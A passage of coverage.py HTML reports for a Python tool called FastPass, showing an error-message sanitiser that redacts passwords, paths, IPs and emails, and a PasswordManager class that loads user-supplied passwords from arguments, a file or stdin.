    <p class="mis show_mis"><span class="n"><a id="t63" href="#t63">63</a></span><span class="t">            <span class="nam">logger</span><span class="op">.</span><span class="nam">warning</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Could not create log file </span><span class="op">{</span><span class="nam">log_file</span><span class="op">}</span><span class="fst">: </span><span class="op">{</span><span class="nam">e</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t64" href="#t64">64</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t65" href="#t65">65</a></span><span class="t">    <span class="com"># A3e: Record Program Startup with Config</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t66" href="#t66">66</a></span><span class="t">    <span class="nam">logger</span><span class="op">.</span><span class="nam">debug</span><span class="op">(</span><span class="fst">f"</span><span class="fst">FastPass logger initialized (TTY: </span><span class="op">{</span><span class="nam">is_tty</span><span class="op">}</span><span class="fst">)</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t67" href="#t67">67</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t68" href="#t68">68</a></span><span class="t">    <span class="key">return</span> <span class="nam">logger</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t69" href="#t69">69</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t70" href="#t70">70</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t71" href="#t71">71</a></span><span class="t"><span class="key">def</span> <span class="nam">sanitize_error_message</span><span class="op">(</span><span class="nam">message</span><span class="op">:</span> <span class="nam">str</span><span class="op">)</span> <span class="op">-></span> <span class="nam">str</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t72" href="#t72">72</a></span><span class="t">    <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t73" href="#t73">73</a></span><span class="t"><span class="str">    E3a: Sanitize Error Messages</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t74" href="#t74">74</a></span><span class="t"><span class="str">    Apply sanitize_error_message() to all errors</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t75" href="#t75">75</a></span><span class="t"><span class="str">    Remove paths, passwords, sensitive patterns</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t76" href="#t76">76</a></span><span class="t"><span class="str">    """</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t77" href="#t77">77</a></span><span class="t">    <span class="key">import</span> <span class="nam">re</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t78" href="#t78">78</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t79" href="#t79">79</a></span><span class="t">    <span class="com"># E3a_Sanitize: Pattern-Based Sanitization</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t80" href="#t80">80</a></span><span class="t">    <span class="com"># Remove password=&lt;value>, IP addresses, email addresses</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t81" href="#t81">81</a></span><span class="t">    <span class="nam">sanitized</span> <span class="op">=</span> <span class="nam">message</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t82" href="#t82">82</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t83" href="#t83">83</a></span><span class="t">    <span class="com"># Remove password patterns</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t84" href="#t84">84</a></span><span class="t">    <span class="nam">sanitized</span> <span class="op">=</span> <span class="nam">re</span><span class="op">.</span><span class="nam">sub</span><span class="op">(</span><span class="str">r'password[=:\s]+[^\s,]+'</span><span class="op">,</span> <span class="str">'password=&lt;REDACTED>'</span><span class="op">,</span> <span class="nam">sanitized</span><span class="op">,</span> <span class="nam">flags</span><span class="op">=</span><span class="nam">re</span><span class="op">.</span><span class="nam">IGNORECASE</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t85" href="#t85">85</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t86" href="#t86">86</a></span><span class="t">    <span class="com"># Remove file paths (keep just filename)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t87" href="#t87">87</a></span><span class="t">    <span class="nam">sanitized</span> <span class="op">=</span> <span class="nam">re</span><span class="op">.</span><span class="nam">sub</span><span class="op">(</span><span class="str">r'[A-Za-z]:[\\\/][^\\\/\s]*[\\\/]([^\\\/\s]+)'</span><span class="op">,</span> <span class="str">r'&lt;path>/\1'</span><span class="op">,</span> <span class="nam">sanitized</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t88" href="#t88">88</a></span><span class="t">    <span class="nam">sanitized</span> <span class="op">=</span> <span class="nam">re</span><span class="op">.</span><span class="nam">sub</span><span class="op">(</span><span class="str">r'\/[^\/\s]*\/([^\/\s]+)'</span><span class="op">,</span> <span class="str">r'&lt;path>/\1'</span><span class="op">,</span> <span class="nam">sanitized</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t89" href="#t89">89</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t90" href="#t90">90</a></span><span class="t">    <span class="com"># Remove potential IP addresses</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t91" href="#t91">91</a></span><span class="t">    <span class="nam">sanitized</span> <span class="op">=</span> <span class="nam">re</span><span class="op">.</span><span class="nam">sub</span><span class="op">(</span><span class="str">r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'</span><span class="op">,</span> <span class="str">'&lt;IP_ADDRESS>'</span><span class="op">,</span> <span class="nam">sanitized</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t92" href="#t92">92</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t93" href="#t93">93</a></span><span class="t">    <span class="com"># Remove email addresses</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t94" href="#t94">94</a></span><span class="t">    <span class="nam">sanitized</span> <span class="op">=</span> <span class="nam">re</span><span class="op">.</span><span class="nam">sub</span><span class="op">(</span><span class="str">r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'</span><span class="op">,</span> <span class="str">'&lt;EMAIL>'</span><span class="op">,</span> <span class="nam">sanitized</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t95" href="#t95">95</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t96" href="#t96">96</a></span><span class="t">    <span class="key">return</span> <span class="nam">sanitized</span>&nbsp;</span><span class="r"></span></p>
</main>
<footer>
    <div class="content">
        <p>
            <a class="nav" href="z_6156a86a215061be_config_py.html">&#xab; prev</a> &nbsp; &nbsp;
            <a class="nav" href="index.html">&Hat; index</a> &nbsp; &nbsp;
            <a class="nav" href="index.html">&#xbb; next</a>
            &nbsp; &nbsp; &nbsp;
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
    </div>
</footer>
</body>
</html>
</file>

<file path="reports/coverage/z_9d0a8317fb892e58___init___py.html">
<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Coverage for src\core\password\__init__.py: 100%</title>
    <link rel="icon" sizes="32x32" href="favicon_32_cb_58284776.png">
    <link rel="stylesheet" href="style_cb_dca529e9.css" type="text/css">
    <script src="coverage_html_cb_497bf287.js" defer></script>
</head>
<body class="pyfile">
<header>
    <div class="content">
        <h1>
            <span class="text">Coverage for </span><b>src\core\password\__init__.py</b>:
            <span class="pc_cov">100%</span>
        </h1>
        <aside id="help_panel_wrapper">
            <input id="help_panel_state" type="checkbox">
            <label for="help_panel_state">
                <img id="keyboard_icon" src="keybd_closed_cb_ce680311.png" alt="Show/hide keyboard shortcuts">
            </label>
            <div id="help_panel">
                <p class="legend">Shortcuts on this page</p>
                <div class="keyhelp">
                    <p>
                        <kbd>r</kbd>
                        <kbd>m</kbd>
                        <kbd>x</kbd>
                        &nbsp; toggle line displays
                    </p>
                    <p>
                        <kbd>j</kbd>
                        <kbd>k</kbd>
                        &nbsp; next/prev highlighted chunk
                    </p>
                    <p>
                        <kbd>0</kbd> &nbsp; (zero) top of page
                    </p>
                    <p>
                        <kbd>1</kbd> &nbsp; (one) first highlighted chunk
                    </p>
                    <p>
                        <kbd>[</kbd>
                        <kbd>]</kbd>
                        &nbsp; prev/next file
                    </p>
                    <p>
                        <kbd>u</kbd> &nbsp; up to the index
                    </p>
                    <p>
                        <kbd>?</kbd> &nbsp; show/hide this help
                    </p>
                </div>
            </div>
        </aside>
        <h2>
            <span class="text">2 statements &nbsp;</span>
            <button type="button" class="run button_toggle_run" value="run" data-shortcut="r" title="Toggle lines run">2<span class="text"> run</span></button>
            <button type="button" class="mis show_mis button_toggle_mis" value="mis" data-shortcut="m" title="Toggle lines missing">0<span class="text"> missing</span></button>
            <button type="button" class="exc show_exc button_toggle_exc" value="exc" data-shortcut="x" title="Toggle lines excluded">0<span class="text"> excluded</span></button>
        </h2>
        <p class="text">
            <a id="prevFileLink" class="nav" href="z_ce21df766c911d41_file_handler_py.html">&#xab; prev</a> &nbsp; &nbsp;
            <a id="indexLink" class="nav" href="index.html">&Hat; index</a> &nbsp; &nbsp;
            <a id="nextFileLink" class="nav" href="z_9d0a8317fb892e58_password_manager_py.html">&#xbb; next</a>
            &nbsp; &nbsp; &nbsp;
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
        <aside class="hidden">
            <button type="button" class="button_next_chunk" data-shortcut="j"></button>
            <button type="button" class="button_prev_chunk" data-shortcut="k"></button>
            <button type="button" class="button_top_of_page" data-shortcut="0"></button>
            <button type="button" class="button_first_chunk" data-shortcut="1"></button>
            <button type="button" class="button_prev_file" data-shortcut="["></button>
            <button type="button" class="button_next_file" data-shortcut="]"></button>
            <button type="button" class="button_to_index" data-shortcut="u"></button>
            <button type="button" class="button_show_hide_help" data-shortcut="?"></button>
        </aside>
    </div>
</header>
<main id="source">
    <p class="pln"><span class="n"><a id="t1" href="#t1">1</a></span><span class="t"><span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t2" href="#t2">2</a></span><span class="t"><span class="str">FastPass Password Handling Modules</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t3" href="#t3">3</a></span><span class="t"><span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t4" href="#t4">4</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t5" href="#t5">5</a></span><span class="t"><span class="key">from</span> <span class="op">.</span><span class="nam">password_manager</span> <span class="key">import</span> <span class="nam">PasswordManager</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t6" href="#t6">6</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t7" href="#t7">7</a></span><span class="t"><span class="nam">__all__</span> <span class="op">=</span> <span class="op">[</span><span class="str">'PasswordManager'</span><span class="op">]</span>&nbsp;</span><span class="r"></span></p>
</main>
<footer>
    <div class="content">
        <p>
            <a class="nav" href="z_ce21df766c911d41_file_handler_py.html">&#xab; prev</a> &nbsp; &nbsp;
            <a class="nav" href="index.html">&Hat; index</a> &nbsp; &nbsp;
            <a class="nav" href="z_9d0a8317fb892e58_password_manager_py.html">&#xbb; next</a>
            &nbsp; &nbsp; &nbsp;
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
    </div>
</footer>
</body>
</html>
</file>

<file path="reports/coverage/z_9d0a8317fb892e58_password_manager_py.html">
<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Coverage for src\core\password\password_manager.py: 76%</title>
    <link rel="icon" sizes="32x32" href="favicon_32_cb_58284776.png">
    <link rel="stylesheet" href="style_cb_dca529e9.css" type="text/css">
    <script src="coverage_html_cb_497bf287.js" defer></script>
</head>
<body class="pyfile">
<header>
    <div class="content">
        <h1>
            <span class="text">Coverage for </span><b>src\core\password\password_manager.py</b>:
            <span class="pc_cov">76%</span>
        </h1>
        <aside id="help_panel_wrapper">
            <input id="help_panel_state" type="checkbox">
            <label for="help_panel_state">
                <img id="keyboard_icon" src="keybd_closed_cb_ce680311.png" alt="Show/hide keyboard shortcuts">
            </label>
            <div id="help_panel">
                <p class="legend">Shortcuts on this page</p>
                <div class="keyhelp">
                    <p>
                        <kbd>r</kbd>
                        <kbd>m</kbd>
                        <kbd>x</kbd>
                        &nbsp; toggle line displays
                    </p>
                    <p>
                        <kbd>j</kbd>
                        <kbd>k</kbd>
                        &nbsp; next/prev highlighted chunk
                    </p>
                    <p>
                        <kbd>0</kbd> &nbsp; (zero) top of page
                    </p>
                    <p>
                        <kbd>1</kbd> &nbsp; (one) first highlighted chunk
                    </p>
                    <p>
                        <kbd>[</kbd>
                        <kbd>]</kbd>
                        &nbsp; prev/next file
                    </p>
                    <p>
                        <kbd>u</kbd> &nbsp; up to the index
                    </p>
                    <p>
                        <kbd>?</kbd> &nbsp; show/hide this help
                    </p>
                </div>
            </div>
        </aside>
        <h2>
            <span class="text">66 statements &nbsp;</span>
            <button type="button" class="run button_toggle_run" value="run" data-shortcut="r" title="Toggle lines run">50<span class="text"> run</span></button>
            <button type="button" class="mis show_mis button_toggle_mis" value="mis" data-shortcut="m" title="Toggle lines missing">16<span class="text"> missing</span></button>
            <button type="button" class="exc show_exc button_toggle_exc" value="exc" data-shortcut="x" title="Toggle lines excluded">0<span class="text"> excluded</span></button>
        </h2>
        <p class="text">
            <a id="prevFileLink" class="nav" href="z_9d0a8317fb892e58___init___py.html">&#xab; prev</a> &nbsp; &nbsp;
            <a id="indexLink" class="nav" href="index.html">&Hat; index</a> &nbsp; &nbsp;
            <a id="nextFileLink" class="nav" href="z_ce21df766c911d41_security_py.html">&#xbb; next</a>
            &nbsp; &nbsp; &nbsp;
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
        <aside class="hidden">
            <button type="button" class="button_next_chunk" data-shortcut="j"></button>
            <button type="button" class="button_prev_chunk" data-shortcut="k"></button>
            <button type="button" class="button_top_of_page" data-shortcut="0"></button>
            <button type="button" class="button_first_chunk" data-shortcut="1"></button>
            <button type="button" class="button_prev_file" data-shortcut="["></button>
            <button type="button" class="button_next_file" data-shortcut="]"></button>
            <button type="button" class="button_to_index" data-shortcut="u"></button>
            <button type="button" class="button_show_hide_help" data-shortcut="?"></button>
        </aside>
    </div>
</header>
<main id="source">
    <p class="pln"><span class="n"><a id="t1" href="#t1">1</a></span><span class="t"><span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t2" href="#t2">2</a></span><span class="t"><span class="str">FastPass Password Management System</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t3" href="#t3">3</a></span><span class="t"><span class="str">Maps to: C3a-C5d Password Management and Testing from flowchart</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t4" href="#t4">4</a></span><span class="t"><span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t5" href="#t5">5</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t6" href="#t6">6</a></span><span class="t"><span class="com"># A1a: Load System Tools</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t7" href="#t7">7</a></span><span class="t"><span class="key">from</span> <span class="nam">pathlib</span> <span class="key">import</span> <span class="nam">Path</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t8" href="#t8">8</a></span><span class="t"><span class="key">from</span> <span class="nam">typing</span> <span class="key">import</span> <span class="nam">List</span><span class="op">,</span> <span class="nam">Optional</span><span class="op">,</span> <span class="nam">Dict</span><span class="op">,</span> <span class="nam">Any</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t9" href="#t9">9</a></span><span class="t"><span class="key">import</span> <span class="nam">logging</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t10" href="#t10">10</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t11" href="#t11">11</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t12" href="#t12">12</a></span><span class="t"><span class="key">class</span> <span class="nam">PasswordManager</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t13" href="#t13">13</a></span><span class="t">    <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t14" href="#t14">14</a></span><span class="t"><span class="str">    Password handling with multiple sources and priority algorithm</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t15" href="#t15">15</a></span><span class="t"><span class="str">    Maps to: C3a-C5d from flowchart</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t16" href="#t16">16</a></span><span class="t"><span class="str">    """</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t17" href="#t17">17</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t18" href="#t18">18</a></span><span class="t">    <span class="key">def</span> <span class="nam">__init__</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">cli_passwords</span><span class="op">:</span> <span class="nam">List</span><span class="op">[</span><span class="nam">str</span><span class="op">]</span> <span class="op">=</span> <span class="key">None</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t19" href="#t19">19</a></span><span class="t">                 <span class="nam">password_list_file</span><span class="op">:</span> <span class="nam">Optional</span><span class="op">[</span><span class="nam">Path</span><span class="op">]</span> <span class="op">=</span> <span class="key">None</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t20" href="#t20">20</a></span><span class="t">                 <span class="nam">stdin_mapping</span><span class="op">:</span> <span class="nam">Optional</span><span class="op">[</span><span class="nam">Dict</span><span class="op">[</span><span class="nam">str</span><span class="op">,</span> <span class="nam">str</span><span class="op">]</span><span class="op">]</span> <span class="op">=</span> <span class="key">None</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t21" href="#t21">21</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t22" href="#t22">22</a></span><span class="t"><span class="str">        C3a-C3c: Initialize PasswordManager Class</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t23" href="#t23">23</a></span><span class="t"><span class="str">        Set up password storage and management</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t24" href="#t24">24</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t25" href="#t25">25</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t26" href="#t26">26</a></span><span class="t">        <span class="com"># C3b: Remember User's Passwords</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t27" href="#t27">27</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">cli_passwords</span> <span class="op">=</span> <span class="nam">cli_passwords</span> <span class="key">or</span> <span class="op">[</span><span class="op">]</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t28" href="#t28">28</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">password_list_file</span> <span class="op">=</span> <span class="nam">password_list_file</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t29" href="#t29">29</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">stdin_mapping</span> <span class="op">=</span> <span class="nam">stdin_mapping</span> <span class="key">or</span> <span class="op">{</span><span class="op">}</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t30" href="#t30">30</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t31" href="#t31">31</a></span><span class="t">        <span class="com"># C3c: Prepare Password Storage</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t32" href="#t32">32</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">password_list</span> <span class="op">=</span> <span class="op">[</span><span class="op">]</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t33" href="#t33">33</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t34" href="#t34">34</a></span><span class="t">        <span class="com"># C3d: Load Passwords from File</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t35" href="#t35">35</a></span><span class="t">        <span class="key">if</span> <span class="nam">self</span><span class="op">.</span><span class="nam">password_list_file</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t36" href="#t36">36</a></span><span class="t">            <span class="nam">self</span><span class="op">.</span><span class="nam">_load_password_list</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t37" href="#t37">37</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t38" href="#t38">38</a></span><span class="t">    <span class="key">def</span> <span class="nam">_load_password_list</span><span class="op">(</span><span class="nam">self</span><span class="op">)</span> <span class="op">-></span> <span class="key">None</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t39" href="#t39">39</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t40" href="#t40">40</a></span><span class="t"><span class="str">        C3d_Load: Read Passwords from File</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t41" href="#t41">41</a></span><span class="t"><span class="str">        Load passwords from text file, one per line</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t42" href="#t42">42</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t43" href="#t43">43</a></span><span class="t">        <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t44" href="#t44">44</a></span><span class="t">            <span class="key">with</span> <span class="nam">open</span><span class="op">(</span><span class="nam">self</span><span class="op">.</span><span class="nam">password_list_file</span><span class="op">,</span> <span class="str">'r'</span><span class="op">,</span> <span class="nam">encoding</span><span class="op">=</span><span class="str">'utf-8'</span><span class="op">)</span> <span class="key">as</span> <span class="nam">f</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t45" href="#t45">45</a></span><span class="t">                <span class="nam">self</span><span class="op">.</span><span class="nam">password_list</span> <span class="op">=</span> <span class="op">[</span><span class="nam">line</span><span class="op">.</span><span class="nam">strip</span><span class="op">(</span><span class="op">)</span> <span class="key">for</span> <span class="nam">line</span> <span class="key">in</span> <span class="nam">f</span> <span class="key">if</span> <span class="nam">line</span><span class="op">.</span><span class="nam">strip</span><span class="op">(</span><span class="op">)</span><span class="op">]</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t46" href="#t46">46</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t47" href="#t47">47</a></span><span class="t">            <span class="com"># C3d_Load_Success: Passwords Successfully Loaded</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t48" href="#t48">48</a></span><span class="t">            <span class="nam">print</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Loaded </span><span class="op">{</span><span class="nam">len</span><span class="op">(</span><span class="nam">self</span><span class="op">.</span><span class="nam">password_list</span><span class="op">)</span><span class="op">}</span><span class="fst"> passwords from file</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t49" href="#t49">49</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t50" href="#t50">50</a></span><span class="t">        <span class="key">except</span> <span class="nam">FileNotFoundError</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t51" href="#t51">51</a></span><span class="t">            <span class="com"># C3d_Load_Error: Cannot Read Password File</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t52" href="#t52">52</a></span><span class="t">            <span class="nam">print</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Warning: Password list file not found: </span><span class="op">{</span><span class="nam">self</span><span class="op">.</span><span class="nam">password_list_file</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t53" href="#t53">53</a></span><span class="t">            <span class="nam">self</span><span class="op">.</span><span class="nam">password_list</span> <span class="op">=</span> <span class="op">[</span><span class="op">]</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t54" href="#t54">54</a></span><span class="t">        <span class="key">except</span> <span class="nam">Exception</span> <span class="key">as</span> <span class="nam">e</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t55" href="#t55">55</a></span><span class="t">            <span class="nam">print</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Warning: Error reading password file </span><span class="op">{</span><span class="nam">self</span><span class="op">.</span><span class="nam">password_list_file</span><span class="op">}</span><span class="fst">: </span><span class="op">{</span><span class="nam">e</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t56" href="#t56">56</a></span><span class="t">            <span class="nam">self</span><span class="op">.</span><span class="nam">password_list</span> <span class="op">=</span> <span class="op">[</span><span class="op">]</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t57" href="#t57">57</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t58" href="#t58">58</a></span><span class="t">    <span class="key">def</span> <span class="nam">get_password_candidates</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">file_path</span><span class="op">:</span> <span class="nam">Path</span><span class="op">)</span> <span class="op">-></span> <span class="nam">List</span><span class="op">[</span><span class="nam">str</span><span class="op">]</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t59" href="#t59">59</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t60" href="#t60">60</a></span><span class="t"><span class="str">        C4a-C4e: Get prioritized list of passwords to try for a file</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t61" href="#t61">61</a></span><span class="t"><span class="str">        Build password list with priority ordering</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t62" href="#t62">62</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t63" href="#t63">63</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t64" href="#t64">64</a></span><span class="t">        <span class="com"># C4a: Start Building Password List</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t65" href="#t65">65</a></span><span class="t">        <span class="nam">candidates</span> <span class="op">=</span> <span class="op">[</span><span class="op">]</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t66" href="#t66">66</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t67" href="#t67">67</a></span><span class="t">        <span class="com"># Check for file-specific password from stdin mapping</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t68" href="#t68">68</a></span><span class="t">        <span class="key">if</span> <span class="nam">self</span><span class="op">.</span><span class="nam">stdin_mapping</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t69" href="#t69">69</a></span><span class="t">            <span class="nam">file_name</span> <span class="op">=</span> <span class="nam">file_path</span><span class="op">.</span><span class="nam">name</span>&nbsp;</span><span class="r"></span></p>
